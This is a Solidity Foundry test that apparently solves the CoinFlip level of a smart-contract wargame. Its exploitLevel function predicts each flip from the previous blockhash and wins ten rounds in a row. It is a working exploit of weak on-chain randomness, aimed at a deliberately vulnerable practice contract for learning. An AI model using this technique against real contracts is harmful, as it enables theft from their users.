// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/CoinFlip.sol";
import "src/levels/CoinFlipFactory.sol";

contract TestCoinFlip is BaseTest {
    CoinFlip private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new CoinFlipFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = CoinFlip(levelAddress);
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        uint256 Factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        for (uint256 i = 0; i < 10; i++) {
            uint256 blockValue = uint256(blockhash(block.number - (1)));
            uint256 coinFlip = blockValue/(Factor);
            bool side = coinFlip == 1 ? true : false;

            level.flip(side);
            utilities.mineBlocks(1);
        }

        vm.stopPrank();
    }
}
